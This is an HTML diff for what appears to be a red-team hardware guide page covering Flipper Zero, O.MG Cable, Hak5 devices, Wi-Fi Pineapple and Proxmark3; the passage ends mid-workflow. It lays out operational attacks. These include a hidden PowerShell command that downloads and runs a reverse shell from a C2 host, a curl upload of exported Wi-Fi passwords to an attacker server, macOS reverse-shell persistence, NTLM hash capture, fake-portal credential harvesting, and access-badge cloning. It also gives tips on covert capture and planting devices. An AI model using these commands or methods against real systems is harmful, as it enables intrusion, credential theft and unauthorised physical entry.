+    <span class="attack-code">NFC → Read → card identified → Saved → [card name] → Emulate → present to reader</span>
+  </div>
+  <div class="attack-card rv">
+    <div class="attack-card-hd"><span class="attack-ico">&#128421;&#65039;</span><div class="attack-name">BadUSB -- HID Keystroke Injection</div><span class="attack-tag">DuckyScript · USB-C</span></div>
+    <div class="attack-desc">Connect Flipper via USB-C to a target computer. Navigate to <strong style="color:var(--c)">BadUSB &rarr; [select script]</strong>. The Flipper enumerates as a USB keyboard and executes DuckyScript payloads. Store payload scripts on the MicroSD card under <code style="font-family:var(--mono);color:var(--c)">/badusb/</code>. Scripts support DELAY, STRING, ENTER, GUI, CTRL, ALT key combinations. Effective on locked or unlocked machines -- useful for conference room drops and IT closet access scenarios.</div>
+    <span class="attack-code">BadUSB → select /badusb/payload.txt → [target USB port] → Run → keystrokes injected</span>
+  </div>
+  <div class="attack-card rv">
+    <div class="attack-card-hd"><span class="attack-ico">&#128247;</span><div class="attack-name">IR Remote Universal Control</div><span class="attack-tag">Infrared · 38 kHz carrier</span></div>
+    <div class="attack-desc">Use <strong style="color:var(--c)">Infrared &rarr; Learn New Remote</strong> to capture and replay any infrared signal -- TV remotes, projectors, air conditioning units, security camera IR illuminators. The Flipper includes a built-in universal remote database covering 1000+ devices. In physical assessments, IR control is used to disable security camera night vision, operate PTZ cameras, and disrupt AV equipment in conference rooms to create distraction windows.</div>
+    <span class="attack-code">Infrared → Universal Remote → TV/AC/projector brands → Power/Mute/Source signals</span>
+  </div>
+  <div class="panel rv" style="margin-top:24px"><div class="panel-t">Flipper Zero Add-Ons &amp; Hardware Modules</div>
+    <div class="addon-grid">
+      <div class="addon-card"><div class="addon-name">Wi-Fi DevBoard</div><span class="addon-type">Official Add-On</span><div class="addon-desc">ESP32-S2 module connecting to Flipper GPIO. Enables Wi-Fi scanning, Evil Portal captive credential capture, and Marauder firmware for deauth/beacon flood attacks. Plugs directly onto top GPIO header.</div></div>
+      <div class="addon-card"><div class="addon-name">Video Game Module</div><span class="addon-type">Official Add-On</span><div class="addon-desc">RP2040 co-processor for Flipper. Runs Doom, video output, and expanded computation. Also used as a hardware fuzzing platform for GPIO-connected embedded targets via its UART/SPI/I2C interfaces.</div></div>
+      <div class="addon-card"><div class="addon-name">NRF24 / CC1101 Modules</div><span class="addon-type">Community GPIO</span><div class="addon-desc">External SPI radio modules for 2.4 GHz (NRF24L01) or extended Sub-GHz coverage beyond the built-in CC1101. Used for MouseJack wireless keyboard attacks (NRF24) and additional RF protocol coverage.</div></div>
+      <div class="addon-card"><div class="addon-name">Raspberry Pi Hat Adapter</div><span class="addon-type">Community GPIO</span><div class="addon-desc">GPIO breakout adapter connecting Flipper to Raspberry Pi GPIO header. Turns the Flipper into a hardware interface bridge for Pi-based embedded security testing rigs.</div></div>
+      <div class="addon-card"><div class="addon-name">iButton Adapters</div><span class="addon-type">Accessory</span><div class="addon-desc">Magnetic iButton (Dallas/Maxim 1-Wire) contact adapters for reading DS1990A and DS1992 keys used in older building access systems -- common in Eastern European and CIS countries.</div></div>
+      <div class="addon-card"><div class="addon-name">SD Card Signal Packs</div><span class="addon-type">Database</span><div class="addon-desc">Community-maintained databases loaded to MicroSD: Sub-GHz signal libraries, IR remote databases, NFC card collections, BadUSB payload repositories, and Flipper script collections from GitHub.</div></div>
+    </div>
+  </div>
+</section>
+<div class="div"></div>
+
+<!-- 03 BAD USB + O.MG -->
+<section class="sec rv" id="usb">
+  <div class="sec-hd"><span class="sec-n">03 //</span><h2 class="sec-t">Bad USB &amp; O.MG Cable -- HID Attack Platforms<span class="tw-cursor"></span></h2><div class="sec-ln"></div></div>
+  <div class="panel rv-l">
+    <p>Bad USB devices exploit the fundamental trust operating systems place in USB Human Interface Devices. A computer receives a USB keyboard without authentication, executing keystrokes at machine speed (1000+ characters/second). The <strong style="color:var(--c)">O.MG Cable</strong> conceals a full Wi-Fi-enabled HID implant inside a cable housing physically indistinguishable from a legitimate Apple USB-C or Lightning cable -- giving operators remote wireless payload delivery up to 90 metres after initial plug-in.</p>
+  </div>
+  <div class="card-2col rv">
+    <div class="spec-panel">
+      <div class="spec-panel-t">O.MG Cable Specs</div>
+      <div class="spec-row"><span class="spec-k">Disguise</span><span class="spec-v">USB-C / Lightning / USB-A</span></div>
+      <div class="spec-row"><span class="spec-k">Wireless</span><span class="spec-v">802.11 b/g/n 2.4 GHz</span></div>
+      <div class="spec-row"><span class="spec-k">Range</span><span class="spec-v">~90m line-of-sight</span></div>
+      <div class="spec-row"><span class="spec-k">Interface</span><span class="spec-v">Web UI at 192.168.4.1</span></div>
+      <div class="spec-row"><span class="spec-k">Payloads</span><span class="spec-v">DuckyScript (live inject)</span></div>
+      <div class="spec-row"><span class="spec-k">Geofence</span><span class="spec-v">GPS-based trigger (Elite)</span></div>
+      <div class="spec-row"><span class="spec-k">Self-destruct</span><span class="spec-v">Remote wipe supported</span></div>
+    </div>
+    <div class="spec-panel">
+      <div class="spec-panel-t">DigiSpark ATTiny85</div>
+      <div class="spec-row"><span class="spec-k">MCU</span><span class="spec-v">ATTiny85 · 8 MHz</span></div>
+      <div class="spec-row"><span class="spec-k">USB</span><span class="spec-v">V-USB software HID</span></div>
+      <div class="spec-row"><span class="spec-k">Price</span><span class="spec-v">~$2-5 per unit</span></div>
+      <div class="spec-row"><span class="spec-k">Storage</span><span class="spec-v">6 KB flash (payload embedded)</span></div>
+      <div class="spec-row"><span class="spec-k">Program via</span><span class="spec-v">Arduino IDE + DigiKeyboard lib</span></div>
+      <div class="spec-row"><span class="spec-k">Form factor</span><span class="spec-v">9mm × 18mm (fits in charger)</span></div>
+      <div class="spec-row"><span class="spec-k">Firmware</span><span class="spec-v">Micronucleus bootloader</span></div>
+    </div>
+  </div>
+  <div class="attack-card rv">
+    <div class="attack-card-hd"><span class="attack-ico">&#9889;</span><div class="attack-name">Windows Reverse Shell Injection</div><span class="attack-tag">DuckyScript · PowerShell</span></div>
+    <div class="attack-desc">Opens Run dialog silently, launches a hidden PowerShell session, downloads and executes a staged reverse shell from a C2 server. Completes in under 3 seconds on an unlocked workstation. The entire payload never touches disk -- all execution happens in memory via PowerShell IEX. For the O.MG Cable version, the same payload is injected wirelessly through the web interface from an operator in a car park or adjacent room.</div>
+    <span class="attack-code">GUI r → powershell -nop -w hidden -c "IEX(IWR http://c2/s.ps1)" → ENTER</span>
+  </div>
+  <div class="attack-card rv">
+    <div class="attack-card-hd"><span class="attack-ico">&#128190;</span><div class="attack-name">Wi-Fi Password Exfiltration</div><span class="attack-tag">Windows netsh · HTTP POST</span></div>
+    <div class="attack-desc">Exports all saved Windows Wi-Fi profiles (including passwords in plaintext) using the built-in <code style="font-family:var(--mono);color:var(--c)">netsh wlan export profile key=clear</code> command, then immediately uploads the resulting XML files to an attacker-controlled server using curl (available by default on Windows 10+). The entire operation takes 4-6 seconds and requires no elevated privileges -- all Wi-Fi passwords are readable by any local user.</div>
+    <span class="attack-code">netsh wlan export profile key=clear → curl -F "f=@*.xml" http://attacker/upload</span>
+  </div>
+  <div class="attack-card rv">
+    <div class="attack-card-hd"><span class="attack-ico">&#127822;</span><div class="attack-name">macOS Persistence via LaunchAgent</div><span class="attack-tag">macOS · ~/Library/LaunchAgents</span></div>
+    <div class="attack-desc">Opens Terminal via Spotlight, writes a LaunchAgent plist to the user's Library folder, and loads it with launchctl. The LaunchAgent establishes a reverse bash shell on every system boot without requiring root privileges. Since LaunchAgents run as the current user, they survive standard security tool detection that focuses on system-level persistence mechanisms and do not require password prompts.</div>
+    <span class="attack-code">Spotlight → Terminal → write ~/Library/LaunchAgents/com.upd.plist → launchctl load</span>
+  </div>
+  <div class="attack-card rv">
+    <div class="attack-card-hd"><span class="attack-ico">&#128279;</span><div class="attack-name">O.MG Cable -- Wireless C2 Delivery</div><span class="attack-tag">Wi-Fi AP · 192.168.4.1</span></div>
+    <div class="attack-desc">Once an O.MG Cable is plugged into a target machine by any means (left at a reception desk as "lost property", swapped during a meeting, or pre-positioned during physical access), the operator connects to the cable's Wi-Fi access point from up to 90 metres and injects payloads through the browser-based interface. The Elite version supports geofencing (only execute payloads at specific GPS coordinates), scheduled execution, and remote self-destruct to eliminate forensic evidence.</div>
+    <span class="attack-code">Connect to O.MG-AP → 192.168.4.1 → paste DuckyScript → Inject → payload fires remotely</span>
+  </div>
+  <div class="panel rv" style="margin-top:24px"><div class="panel-t">Bad USB Platform Add-Ons &amp; Accessories</div>
+    <div class="addon-grid">
+      <div class="addon-card"><div class="addon-name">O.MG Programmer</div><span class="addon-type">O.MG Accessory</span><div class="addon-desc">Official O.MG firmware flashing tool. Updates O.MG Cable firmware, loads custom configurations, and transfers payload libraries to the cable's embedded storage. Required for firmware upgrades and initial setup.</div></div>
+      <div class="addon-card"><div class="addon-name">Teensy 4.1</div><span class="addon-type">Advanced Platform</span><div class="addon-desc">600 MHz ARM Cortex-M7 USB dev board. Supports simultaneous keyboard + mouse + MIDI + serial HID emulation. Programmable in C++ for complex payloads requiring conditional logic, LED feedback, and multi-stage execution that DuckyScript cannot handle.</div></div>
+      <div class="addon-card"><div class="addon-name">USB Condom / Data Blocker</div><span class="addon-type">Defensive Reference</span><div class="addon-desc">Hardware data-only USB adapters that block the D+/D- data lines -- pass-through power only. Understanding what defenders use (USB condoms, port locks, USB port blockers) is essential for planning physical engagement scenarios where these controls may be in place.</div></div>
+      <div class="addon-card"><div class="addon-name">PayloadStudio</div><span class="addon-type">Development Tool</span><div class="addon-desc">Hak5's browser-based DuckyScript IDE (payloadstudio.hak5.org). Syntax highlighting, script validation, one-click compilation to inject.bin for Rubber Ducky. Community library of 300+ ready-to-deploy payloads organised by category and OS target.</div></div>
+    </div>
+  </div>
+</section>
+<div class="div"></div>
+
+<!-- 04 HAK5 ARSENAL -->
+<section class="sec rv" id="hak5">
+  <div class="sec-hd"><span class="sec-n">04 //</span><h2 class="sec-t">Hak5 Arsenal -- Rubber Ducky, Bash Bunny, LAN Turtle<span class="tw-cursor"></span></h2><div class="sec-ln"></div></div>
+  <div class="panel rv-l">
+    <p><strong style="color:var(--c)">Hak5</strong> produces the professional standard for hardware attack platforms. The three flagship devices cover distinct attack domains: the <strong style="color:var(--g)">USB Rubber Ducky</strong> for pure HID keystroke injection, the <strong style="color:var(--g)">Bash Bunny</strong> as a multi-mode USB attack platform running full Debian Linux, and the <strong style="color:var(--g)">LAN Turtle</strong> as a covert network implant disguised as a USB Ethernet adapter. The Hak5 payload library on GitHub contains hundreds of community payloads ready to deploy.</p>
+  </div>
+
+  <div class="attack-card rv">
+    <div class="attack-card-hd"><span class="attack-ico">&#128040;</span><div class="attack-name">USB Rubber Ducky Gen 3 -- DuckyScript 3.0</div><span class="attack-tag">Pure HID · 1000 chars/sec</span></div>
+    <div class="attack-desc">The Rubber Ducky Gen 3 introduces DuckyScript 3.0 with full programming constructs -- variables, conditionals, functions, loops, and OS detection. The <code style="font-family:var(--mono);color:var(--c)">DETECT_OS()</code> function checks the target OS and branches to platform-appropriate payloads automatically. <code style="font-family:var(--mono);color:var(--c)">ATTACKMODE HID STORAGE</code> presents the Ducky simultaneously as a keyboard and USB drive, enabling payloads that type commands and read/write files in a single deployment.</div>
+    <span class="attack-code">DETECT_OS() → IF WINDOWS: ATTACKMODE HID → GUI r → payload → ELIF MACOS: Spotlight → payload</span>
+  </div>
+  <div class="card-2col rv">
+    <div class="spec-panel">
+      <div class="spec-panel-t">Rubber Ducky Specs</div>
+      <div class="spec-row"><span class="spec-k">MCU</span><span class="spec-v">RP2040 · 133 MHz dual-core</span></div>
+      <div class="spec-row"><span class="spec-k">Storage</span><span class="spec-v">MicroSD (payload + loot)</span></div>
+      <div class="spec-row"><span class="spec-k">Script</span><span class="spec-v">DuckyScript 3.0</span></div>
+      <div class="spec-row"><span class="spec-k">Modes</span><span class="spec-v">HID, HID+Storage, Serial</span></div>
+      <div class="spec-row"><span class="spec-k">Speed</span><span class="spec-v">1000+ keystrokes/sec</span></div>
+      <div class="spec-row"><span class="spec-k">IDE</span><span class="spec-v">payloadstudio.hak5.org</span></div>
+    </div>
+    <div class="spec-panel">
+      <div class="spec-panel-t">Payload Categories</div>
+      <div class="spec-row"><span class="spec-k">Recon</span><span class="spec-v">System info, user, network enum</span></div>
+      <div class="spec-row"><span class="spec-k">Credential</span><span class="spec-v">Browser passwords, Wi-Fi keys</span></div>
+      <div class="spec-row"><span class="spec-k">Exfil</span><span class="spec-v">Files via HTTP/DNS/USB storage</span></div>
+      <div class="spec-row"><span class="spec-k">Persistence</span><span class="spec-v">Registry, crontab, LaunchAgent</span></div>
+      <div class="spec-row"><span class="spec-k">C2 Drop</span><span class="spec-v">Reverse shell, RAT, beacon</span></div>
+      <div class="spec-row"><span class="spec-k">Phishing</span><span class="spec-v">Credential overlay / fake prompt</span></div>
+    </div>
+  </div>
+
+  <div class="attack-card rv">
+    <div class="attack-card-hd"><span class="attack-ico">&#128007;</span><div class="attack-name">Bash Bunny -- Multi-Mode USB Attack Platform</div><span class="attack-tag">RNDIS · HID · STORAGE · ECM</span></div>
+    <div class="attack-desc">The Bash Bunny runs full Debian Linux internally and can present as any combination of USB device: keyboard, mass storage, Ethernet adapter, or serial console. The most powerful attack mode is <code style="font-family:var(--mono);color:var(--c)">ATTACKMODE RNDIS_ETHERNET HID</code> -- simultaneously acting as a USB Ethernet adapter (giving the attacker a network path into the target) and a keyboard (injecting commands). Combined with <strong style="color:var(--c)">Responder</strong> running on the USB Ethernet interface, the Bash Bunny captures NTLM hashes from any Windows machine it is plugged into without requiring network access.</div>
+    <span class="attack-code">ATTACKMODE RNDIS_ETHERNET HID → Responder.py -I usb0 → NTLM hashes captured → crack offline</span>
+  </div>
+  <div class="attack-card rv">
+    <div class="attack-card-hd"><span class="attack-ico">&#128034;</span><div class="attack-name">LAN Turtle -- Covert Network Implant</div><span class="attack-tag">USB Ethernet · AutoSSH · Pivot</span></div>
+    <div class="attack-desc">The LAN Turtle appears as a generic USB-to-Ethernet adapter but runs OpenWrt Linux internally with a modular attack framework. Plugged into any available network port -- conference room, printer, lobby terminal, IT closet -- it establishes an outbound AutoSSH reverse tunnel to an attacker-controlled VPS, providing persistent network access that bypasses perimeter firewalls (outbound SSH on port 22 or 443 is almost never blocked). Once the tunnel is established, the operator has full access to the internal network from anywhere in the world.</div>
+    <span class="attack-code">LAN Turtle → AutoSSH → outbound SSH to VPS → operator SSH via VPS → internal network pivot</span>
+  </div>
+
+  <div class="panel rv" style="margin-top:24px"><div class="panel-t">Hak5 Device Add-Ons &amp; Modules</div>
+    <div class="addon-grid">
+      <div class="addon-card"><div class="addon-name">Bash Bunny Community Payloads</div><span class="addon-type">github.com/hak5/bashbunny-payloads</span><div class="addon-desc">300+ community payloads including QuickCreds (Responder NTLM capture), BunnyTap (network tap), Impacket attacks, Active Directory recon, and automated credential exfiltration scripts. Categorised by attack type and target OS.</div></div>
+      <div class="addon-card"><div class="addon-name">LAN Turtle Modules</div><span class="addon-type">Modular Framework</span><div class="addon-desc">AutoSSH (reverse tunnel), Responder (NTLM capture), DNSSpoof (DNS hijack), Meterpreter (MSF session), nmap scanner, and Netcat listener. Install via the turtle module menu over SSH when in arming mode.</div></div>
+      <div class="addon-card"><div class="addon-name">Packet Squirrel</div><span class="addon-type">Hak5 Companion</span><div class="addon-desc">Inline network device (RJ45 pass-through) that performs passive packet capture, VPN tunnelling, and TCP injection. Sits between a target device and its network connection, capturing all traffic to MicroSD or exfiltrating via OpenVPN.</div></div>
+      <div class="addon-card"><div class="addon-name">Ducky Payload Library</div><span class="addon-type">github.com/hak5/usbrubberducky-payloads</span><div class="addon-desc">Official curated payload library for USB Rubber Ducky. Includes Windows, macOS, Linux, and ChromeOS payloads for every common attack category. All payloads tested and categorised by DuckyScript version compatibility.</div></div>
+    </div>
+  </div>
+</section>
+<div class="div"></div>
+
+<!-- 05 WI-FI DEVICES -->
+<section class="sec rv" id="wifi">
+  <div class="sec-hd"><span class="sec-n">05 //</span><h2 class="sec-t">Wi-Fi Pineapple &amp; Wireless Adapters<span class="tw-cursor"></span></h2><div class="sec-ln"></div></div>
+  <div class="panel rv-l">
+    <p>The <strong style="color:var(--c)">Wi-Fi Pineapple MARK VII</strong> is the professional rogue wireless platform -- a purpose-built dual-band AP with the PineAP KARMA engine, Evil Portal credential harvesting, passive recon, and a modular attack framework. Where improvised hostapd setups require significant CLI configuration, the Pineapple provides a polished web UI deployable in under 60 seconds. <strong style="color:var(--c)">Wireless USB adapters</strong> (Alfa AWUS036ACH, AWUS036ACHM, TP-Link Archer T2U Plus) are the essential companion for Aircrack-ng, Wifite, and hostapd-based attacks from any Linux system.</p>
+  </div>
+  <div class="card-2col rv">
+    <div class="spec-panel">
+      <div class="spec-panel-t">Wi-Fi Pineapple MARK VII</div>
+      <div class="spec-row"><span class="spec-k">CPU</span><span class="spec-v">Qualcomm Atheros AR9531 · 650 MHz</span></div>
+      <div class="spec-row"><span class="spec-k">RAM</span><span class="spec-v">256 MB DDR2</span></div>
+      <div class="spec-row"><span class="spec-k">Storage</span><span class="spec-v">2 GB NAND + MicroSD</span></div>
+      <div class="spec-row"><span class="spec-k">Radios</span><span class="spec-v">2.4 GHz + 5 GHz dual-band</span></div>
+      <div class="spec-row"><span class="spec-k">OS</span><span class="spec-v">OpenWrt (custom Hak5 build)</span></div>
+      <div class="spec-row"><span class="spec-k">Power</span><span class="spec-v">USB-C · 5V 2A (powerbank ready)</span></div>
+      <div class="spec-row"><span class="spec-k">Web UI</span><span class="spec-v">172.16.42.1:1471 (USB-C) or Wi-Fi</span></div>
+    </div>
+    <div class="spec-panel">
+      <div class="spec-panel-t">PineAP Attack Engine</div>
+      <div class="spec-row"><span class="spec-k">KARMA</span><span class="spec-v">Respond to all probe requests</span></div>
+      <div class="spec-row"><span class="spec-k">Beacon Flood</span><span class="spec-v">Broadcast all captured SSIDs</span></div>
+      <div class="spec-row"><span class="spec-k">Deauth</span><span class="spec-v">Force clients off legitimate AP</span></div>
+      <div class="spec-row"><span class="spec-k">Evil Portal</span><span class="spec-v">Captive portal credential harvest</span></div>
+      <div class="spec-row"><span class="spec-k">Recon</span><span class="spec-v">Passive AP + client enumeration</span></div>
+      <div class="spec-row"><span class="spec-k">Traffic</span><span class="spec-v">tcpdump / Wireshark capture</span></div>
+      <div class="spec-row"><span class="spec-k">Modules</span><span class="spec-v">nmap, Responder, SSLsplit, more</span></div>
+    </div>
+  </div>
+  <div class="attack-card rv">
+    <div class="attack-card-hd"><span class="attack-ico">&#127905;</span><div class="attack-name">PineAP KARMA -- Auto-Associate Attack</div><span class="attack-tag">Probe Response · Client Hijack</span></div>
+    <div class="attack-desc">Enable <strong style="color:var(--c)">PineAP &rarr; Beacon Responses: ON</strong> and <strong>Capture SSIDs: ON</strong>. The Pineapple responds to every probe request from any nearby Wi-Fi client, advertising whatever SSID the client is probing for. Phones and laptops probing for remembered networks (office Wi-Fi, hotel networks, coffee shop SSIDs) automatically associate with the Pineapple. Enable <strong>Evil Portal</strong> to serve a fake login page -- captured credentials appear in <strong>Evil Portal &rarr; Captured Credentials</strong> in real time.</div>
+    <span class="attack-code">PineAP ON → Beacon Responses ON → clients auto-associate → Evil Portal → credential capture</span>
+  </div>
+  <div class="attack-card rv">
+    <div class="attack-card-hd"><span class="attack-ico">&#128246;</span><div class="attack-name">Wireless Adapter -- Monitor Mode &amp; PMKID Attack</div><span class="attack-tag">Alfa AWUS036ACH · hcxdumptool</span></div>
+    <div class="attack-desc">Dedicated wireless adapters with chipsets supporting monitor mode and packet injection (Alfa AWUS036ACH with rtl8812au driver, Alfa AWUS036ACHM with MediaTek MT7921AU, TP-Link Archer T2U Plus with rtl88xxau) enable full Aircrack-ng suite operation. The PMKID attack (hcxdumptool) requires no clients -- the PMKID is extracted directly from the AP's authentication handshake, captured in passive monitor mode, converted to Hashcat 22000 format, and cracked GPU-accelerated against a wordlist without any deauthentication frames.</div>
+    <span class="attack-code">hcxdumptool -i wlan0mon → pcapng → hcxpcapngtool → hash.hc22000 → hashcat -m 22000</span>
+  </div>
+  <div class="panel rv" style="margin-top:24px"><div class="panel-t">Wi-Fi Pineapple Modules &amp; Adapter Add-Ons</div>
+    <div class="addon-grid">
+      <div class="addon-card"><div class="addon-name">Evil Portal Templates</div><span class="addon-type">Pineapple Module</span><div class="addon-desc">Pre-built captive portal templates cloning Office 365, Google, Facebook, Cisco WebEx, and corporate VPN login pages. Installed via Pineapple Module Manager. Credential captures logged to SD card and viewable in real time through the web UI.</div></div>
+      <div class="addon-card"><div class="addon-name">Responder Module</div><span class="addon-type">Pineapple Module</span><div class="addon-desc">Runs Responder on the Pineapple's management or client interface to capture NTLM hashes from Windows clients that auto-connect to the rogue AP. Combined with PineAP KARMA, captures domain credentials from any Windows laptop that associates.</div></div>
+      <div class="addon-card"><div class="addon-name">External Directional Antenna</div><span class="addon-type">RF Accessory</span><div class="addon-desc">High-gain directional or panel antennas (9-14 dBi) for Alfa adapters. Enable long-range targeted capture from 500m+ for parking-lot assessments, extended PMKID collection campaigns, and directed Evil Twin attacks at specific buildings.</div></div>
+      <div class="addon-card"><div class="addon-name">USB-C Powerbank Mount</div><span class="addon-type">Deployment Accessory</span><div class="addon-desc">The Pineapple runs on USB-C 5V 2A -- a standard 20,000 mAh powerbank provides 12+ hours of operation. Combined with a magnetic mount, enables covert deployment under tables, in ceiling voids, or in planted laptop bags for extended wireless operations.</div></div>
+    </div>
+  </div>
+</section>
+<div class="div"></div>
+
+<!-- 06 PROXMARK3 -->
+<section class="sec rv" id="rfid">
+  <div class="sec-hd"><span class="sec-n">06 //</span><h2 class="sec-t">Proxmark3 RDV4 -- RFID &amp; NFC Research<span class="tw-cursor"></span></h2><div class="sec-ln"></div></div>
+  <div class="panel rv-l">
+    <p>The <strong style="color:var(--c)">Proxmark3 RDV4</strong> is the gold standard RFID research tool -- used by security researchers, penetration testers, and government agencies worldwide. It reads, writes, emulates, and clones both <strong style="color:var(--g)">Low Frequency (125 kHz)</strong> cards (HID Prox, EM4100, AWID, Indala -- the majority of corporate building access control) and <strong style="color:var(--c)">High Frequency (13.56 MHz)</strong> cards (MIFARE Classic, DESFire, iCLASS, NTAG, ISO14443/15693). The MIFARE Classic attack suite is devastating -- CRYPTO1 is fully broken and the Proxmark3 recovers all sector keys via <code style="font-family:var(--mono);color:var(--c)">autopwn</code> in seconds.</p>
+  </div>
+  <div class="card-2col rv">
+    <div class="spec-panel">
+      <div class="spec-panel-t">Proxmark3 RDV4 Hardware</div>
+      <div class="spec-row"><span class="spec-k">CPU</span><span class="spec-v">ARM Cortex-M3 (AT91SAM7S512) + FPGA</span></div>
+      <div class="spec-row"><span class="spec-k">LF</span><span class="spec-v">125 kHz · HID, EM, AWID, Indala</span></div>
+      <div class="spec-row"><span class="spec-k">HF</span><span class="spec-v">13.56 MHz · ISO14443A/B, ISO15693</span></div>
+      <div class="spec-row"><span class="spec-k">Antennas</span><span class="spec-v">Swappable LF + HF antenna kits</span></div>
+      <div class="spec-row"><span class="spec-k">Battery</span><span class="spec-v">Built-in 400 mAh LiPo (standalone)</span></div>
+      <div class="spec-row"><span class="spec-k">BT</span><span class="spec-v">Bluetooth add-on (standalone wireless)</span></div>
+      <div class="spec-row"><span class="spec-k">Client</span><span class="spec-v">proxmark3 CLI (Linux/Windows/macOS)</span></div>
+    </div>
+    <div class="spec-panel">
+      <div class="spec-panel-t">Supported Card Systems</div>
+      <div class="spec-row"><span class="spec-k">HID Prox</span><span class="spec-v">125 kHz · LF · Most corporate access</span></div>
+      <div class="spec-row"><span class="spec-k">EM4100</span><span class="spec-v">125 kHz · LF · Older access systems</span></div>
+      <div class="spec-row"><span class="spec-k">MIFARE Classic</span><span class="spec-v">13.56 MHz · CRYPTO1 (broken)</span></div>
+      <div class="spec-row"><span class="spec-k">MIFARE DESFire</span><span class="spec-v">13.56 MHz · AES (more secure)</span></div>
+      <div class="spec-row"><span class="spec-k">HID iCLASS</span><span class="spec-v">13.56 MHz · DES (crackable)</span></div>
+      <div class="spec-row"><span class="spec-k">NTAG 213/215/216</span><span class="spec-v">NFC · rewrite/emulate</span></div>
+      <div class="spec-row"><span class="spec-k">T5577</span><span class="spec-v">Writable LF clone blank card</span></div>
+    </div>
+  </div>
+  <div class="attack-card rv">
+    <div class="attack-card-hd"><span class="attack-ico">&#128272;</span><div class="attack-name">LF HID Prox -- Read, Clone, Brute Force</div><span class="attack-tag">125 kHz · Corporate Access Control</span></div>
+    <div class="attack-desc">HID Prox is the most common corporate building access control card format. The Proxmark3 reads any HID Prox card in range: <code style="font-family:var(--mono);color:var(--c)">lf hid read</code> captures the facility code and card number. <code style="font-family:var(--mono);color:var(--c)">lf hid clone -r [ID]</code> writes the data to a T5577 blank card in under 5 seconds. The brute force module (<code style="font-family:var(--mono);color:var(--c)">lf hid brute</code>) sequentially tries card numbers within a facility code -- useful when you have identified the facility code but cannot capture a specific card. Long-range LF antennas extend read range to 20-30cm for covert capture in lifts and lobbies.</div>
+    <span class="attack-code">lf hid read → capture ID → lf hid clone -r ID → T5577 blank card → door opens</span>
+  </div>
+  <div class="attack-card rv">
+    <div class="attack-card-hd"><span class="attack-ico">&#9889;</span><div class="attack-name">MIFARE Classic autopwn -- Full Card Compromise</div><span class="attack-tag">CRYPTO1 · darkside · hardnested</span></div>
+    <div class="attack-desc">MIFARE Classic uses the proprietary CRYPTO1 cipher which has been fully cryptanalysed. The Proxmark3 <code style="font-family:var(--mono);color:var(--c)">hf mf autopwn</code> command runs a cascade of attacks: darkside attack (recovers one key without any known keys), nested attack (recovers remaining keys using one known key), and hardnested attack (works even when the reader uses random UIDs). The result is a complete dump of all 16 sectors and all 32 sector keys in under 30 seconds. The dump is then written to a new MIFARE Classic blank card for a perfect clone.</div>
+    <span class="attack-code">hf mf autopwn → all keys recovered → hf-mf-UID-dump.bin → hf mf restore → clone complete</span>
+  </div>
+  <div class="attack-card rv">
+    <div class="attack-card-hd"><span class="attack-ico">&#128187;</span><div class="attack-name">Card Emulation -- No Physical Clone Needed</div><span class="attack-tag">Standalone Mode · Battery Powered</span></div>
+    <div class="attack-desc">The Proxmark3 RDV4 can emulate any card stored in its internal memory without writing to a physical blank card. <code style="font-family:var(--mono);color:var(--c)">hf mf eload</code> loads a card dump to the Proxmark3 RAM, then <code style="font-family:var(--mono);color:var(--c)">hf mf sim</code> presents the Proxmark3 itself to any MIFARE Classic reader. The built-in battery and Bluetooth add-on enable standalone wireless operation -- the operator accesses the Proxmark3 from a phone while tapping it to readers, making the attack entirely wireless and hands-free after initial setup.</div>
+    <span class="attack-code">hf mf eload -f dump.bin → hf mf sim → tap PM3 to reader → access granted (no card needed)</span>
+  </div>
+  <div class="panel rv" style="margin-top:24px"><div class="panel-t">Proxmark3 Add-Ons &amp; Accessories</div>
+    <div class="addon-grid">
+      <div class="addon-card"><div class="addon-name">Bluetooth Add-On</div><span class="addon-type">Official RDV4 Module</span><div class="addon-desc">Bluetooth 4.0 LE module for the RDV4 battery slot. Enables wireless control from a phone or laptop -- critical for standalone operation where plugging a USB cable to a Proxmark3 while tapping doors would be conspicuous. Combined with the PM3 app (iOS/Android) for field operation.</div></div>
+      <div class="addon-card"><div class="addon-name">Long-Range LF Antenna</div><span class="addon-type">Antenna Upgrade</span><div class="addon-desc">Extended-range 125 kHz antenna coils for the Proxmark3. Increases LF read range from 5-8cm to 15-30cm -- enabling covert card capture in crowded lifts, at reception desks, and from a briefcase positioned next to a target carrying an HID Prox card.</div></div>
+      <div class="addon-card"><div class="addon-name">T5577 Blank Cards</div><span class="addon-type">Consumable</span><div class="addon-desc">Multi-protocol writable LF blank cards compatible with HID Prox, EM4100, AWID, Indala, and 15 other formats. Write once with Proxmark3 to create a working clone of any captured LF card. Available in card, fob, and wristband form factors.</div></div>
+      <div class="addon-card"><div class="addon-name">Proxmark3 Mobile App</div><span class="addon-type">iOS / Android</span><div class="addon-desc">Official Proxmark3 mobile application for iOS and Android. Full CLI access via Bluetooth to the RDV4. Run all attack commands, view card dumps, save captures, and manage emulation profiles from a smartphone during covert field operations.</div></div>
+    </div>
+  </div>
+</section>
+<div class="div"></div>
+
+<!-- 07 WORKFLOWS -->
+<section class="sec rv" id="workflows">
+  <div class="sec-hd"><span class="sec-n">07 //</span><h2 class="sec-t">Red Team Hardware Engagement Workflows<span class="tw-cursor"></span></h2><div class="sec-ln"></div></div>
+  <div class="panel rv-l">
+    <p>Professional hardware red team operations chain multiple devices in coordinated attack sequences -- each device filling a specific role in the kill chain. The most impactful engagement patterns combine reconnaissance (Flipper Zero, wireless adapter), initial access (Proxmark3 card clone, BadUSB), persistence (LAN Turtle, O.MG Cable), and exfiltration (Bash Bunny, Pineapple MITM). The devices below are not independent tools -- they are components in an integrated physical penetration testing system.</p>
+  </div>
+  <div class="panel rv"><div class="panel-t">Physical Pentest Kill Chain</div>
+  <div class="flow-grid">
+    <div class="flow-step">
+      <div class="flow-num">01</div>
+      <div class="flow-body">
+        <div class="flow-title">RECONNAISSANCE</div>
+        <div class="flow-desc">Passive RF environment survey from car park or street: identify Sub-GHz transmitters (parking barriers, gate fobs), scan NFC readers on doors to identify card type (Flipper Zero NFC reader detect), capture employee Wi-Fi probe requests from the Pineapple (passive mode), and photograph all visible physical access control hardware to identify manufacturer and card standard.</div>
+        <div class="flow-device">&#128308; Devices: Flipper Zero &bull; Wi-Fi Pineapple (passive) &bull; Wireless Adapter</div>
+      </div>
+    </div>
+    <div class="flow-step">
+      <div class="flow-num">02</div>
+      <div class="flow-body">
+        <div class="flow-title">RFID CARD CAPTURE</div>
